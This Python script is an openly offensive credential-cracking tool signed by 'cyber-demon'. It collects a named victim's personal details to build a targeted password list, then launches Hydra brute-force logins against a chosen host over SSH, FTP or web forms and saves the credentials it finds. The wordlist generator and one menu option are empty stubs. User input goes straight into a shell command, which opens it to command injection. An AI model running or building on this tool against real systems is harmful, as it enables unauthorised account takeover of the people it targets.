import subprocess
import itertools
import time
import random
import string
import os

# ANSI escape codes for colors
RED = '\033[91m'
ENDC = '\033[0m'

# ASCII art banners
logo_banner = RED + '''
⠄⠄⣴⣶⣤⡤⠦⣤⣀⣤⠆⠄⠄⠄⠄⠄⣈⣭⣭⣿⣶⣿⣦⣼⣆⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠉⠻⢿⣿⠿⣿⣿⣶⣦⠤⠄⡠⢾⣿⣿⡿⠋⠉⠉⠻⣿⣿⡛⣦⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠈⠄⠄⠄⠈⢿⣿⣟⠦⠄⣾⣿⣿⣷⠄⠄⠄⠄⠻⠿⢿⣿⣧⣄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣸⣿⣿⢧⠄⢻⠻⣿⣿⣷⣄⣀⠄⠢⣀⡀⠈⠙⠿⠄⠄⠄⠄
⠄⠄⢀⠄⠄⠄⠄⠄⠄⢠⣿⣿⣿⠈⠄⠄⠡⠌⣻⣿⣿⣿⣿⣿⣿⣿⣛⣳⣤⣀⣀⠄⠄
⠄⠄⢠⣧⣶⣥⡤⢄⠄⣸⣿⣿⠘⠄⠄⢀⣴⣿⣿⡿⠛⣿⣿⣧⠈⢿⠿⠟⠛⠻⠿⠄⠄
⠄⣰⣿⣿⠛⠻⣿⣿⡦⢹⣿⣷⠄⠄⠄⢊⣿⣿⡏⠄⠄⢸⣿⣿⡇⠄⢀⣠⣄⣾⠄⠄⠄
⣠⣿⠿⠛⠄⢀⣿⣿⣷⠘⢿⣿⣦⡀⠄⢸⢿⣿⣿⣄⠄⣸⣿⣿⡇⣪⣿⡿⠿⣿⣷⡄⠄
⠙⠃⠄⠄⠄⣼⣿⡟⠌⠄⠈⠻⣿⣿⣦⣌⡇⠻⣿⣿⣷⣿⣿⣿⠐⣿⣿⡇⠄⠛⠻⢷⣄
⠄⠄⠄⠄⠄⢻⣿⣿⣄⠄⠄⠄⠈⠻⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟⠄⠫⢿⣿⡆⠄⠄⠄⠁
⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣀⣤⣾⡿⠃⠄⠄⠄⠄
⠄⠄⠄⠄⢰⣶⠄⠄⣶⠄⢶⣆⢀⣶⠂⣶⡶⠶⣦⡄⢰⣶⠶⢶⣦⠄⠄⣴⣶⠄⠄⠄⠄
⠄⠄⠄⠄⢸⣿⠶⠶⣿⠄⠈⢻⣿⠁⠄⣿⡇⠄⢸⣿⢸⣿⢶⣾⠏⠄⣸⣟⣹⣧⠄⠄⠄
⠄⠄⠄⠄⠸⠿⠄⠄⠿⠄⠄⠸⠿⠄⠄⠿⠷⠶⠿⠃⠸⠿⠄⠙⠷⠤⠿⠉⠉⠿⠆⠄⠄⠀
<======code by cyber-demon ======> ''' + ENDC

loading_animation = [
    RED + 'Loading   [●          ]',
    RED + 'Loading   [● ●        ]',
    RED + 'Loading   [● ● ●      ]',
    RED + 'Loading   [● ● ● ●    ]',
    RED + 'Loading   [● ● ● ● ●  ]',
    RED + 'Loading   [● ● ● ● ● ●]'
]

def generate_wordlist(name, birth_year, keywords, separator='_', permutations=True):
    # Code for generate_wordlist function remains the same as before
    pass

def get_victim_info():
    victim_name = input("Enter victim's name: ")
    victim_birth_year = input("Enter victim's birth year (optional): ")
    keywords = input("Enter additional keywords separated by spaces: ").split()
    return victim_name, victim_birth_year, keywords

def generate_and_save_wordlist(filename, wordlist):
    with open(filename, 'w') as file:
        file.write('\n'.join(wordlist))

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def perform_hydra_attack_own_wordlist(target, protocol):
    print("Choose an option:")
    print("1. Single username Attack")
    print("2. Multiple usernames Attack")
    user_choice = input("Enter your choice (1/2): ")

    if user_choice == '1':
        single_username = input("Enter the single username: ")
        passlist_path = input("Enter the path to the password list: ")
        hydra_command = f"hydra -l {single_username} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"
    elif user_choice == '2':
        usernames_path = input("Enter the path to the file containing multiple usernames: ")
        passlist_path = input("Enter the path to the password list: ")
        hydra_command = f"hydra -L {usernames_path} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"
    else:
        clear_terminal()
        print("Invalid choice.")
        

    clear_terminal()
    print(RED + "Starting Advanced Hydra Brute-force Attack..." + ENDC)
    
    for frame in loading_animation:
        print(frame, end='\r')
        time.sleep(0.5)
    
    print("\n")
    try:
        subprocess.run(hydra_command, shell=True, check=True)
        print("Brute-force attack completed. Check found_credentials.txt for results.")
    except subprocess.CalledProcessError as e:
        print(f"Error running Hydra: {e}")

# Clear the terminal when the tool starts
clear_terminal()

while True:
    print(logo_banner)
    print("Choose an option:")
    print("1. Generate wordlist only")
    print("2. Perform Hydra attack")
    print("3. Perform Hydra attack using generated wordlist")
    print("4. Exit")
    option = input("Enter your choice (1/2/3/4): ")

    if option == '1':
        victim_name, victim_birth_year, victim_keywords = get_victim_info()
        generated_wordlist = generate_wordlist(victim_name, victim_birth_year, victim_keywords)
        wordlist_file = "wordlist.txt"
        generate_and_save_wordlist(wordlist_file, generated_wordlist)
        print(f"Wordlist generated and saved to {wordlist_file}")
    elif option == '2':
        target = input("Enter the target (e.g., IP address, URL): ")
        protocol = input("Enter the protocol (e.g., ftp, ssh, http-post-form): ")
        perform_hydra_attack_own_wordlist(target, protocol)
    elif option == '3':
        # Code for option 3 remains the same as before
        pass
    elif option == '4':
        break
    else:
        print("Invalid option selected.")
input("Press Enter to continue...")

